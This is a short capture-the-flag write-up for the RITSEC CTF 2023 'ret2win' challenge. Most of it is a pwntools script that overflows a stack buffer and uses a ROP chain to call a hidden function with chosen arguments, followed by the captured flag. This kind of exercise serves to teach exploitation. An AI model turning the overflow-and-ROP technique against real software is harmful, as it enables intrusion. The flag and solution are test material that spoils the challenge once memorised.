![image](https://user-images.githubusercontent.com/63996033/229366510-82c04970-d584-4b07-bf92-628c8b1719dd.png)

[ret2win](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/ret2win/ret2win)

Solution:
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        print("here")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
offset = 40

pop_rdi = 0x4012b3
pop_rsi_r15 = 0x4012b1

payload = flat({
    offset: [
        pop_rdi,  # Pop the next value to RDI
        0xcafebabe,
        pop_rsi_r15,  # Pop the next value to RSI (and junk into R15)
         0xc0debabe,
        0x0,
        # With params in correct registers, call hacked function
        elf.functions.supersecrettoplevelfunction
    ]
})


# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()

```

Flag: `RS{WHAT'S_A_CTF_WITH0UT_RET2WIN}`
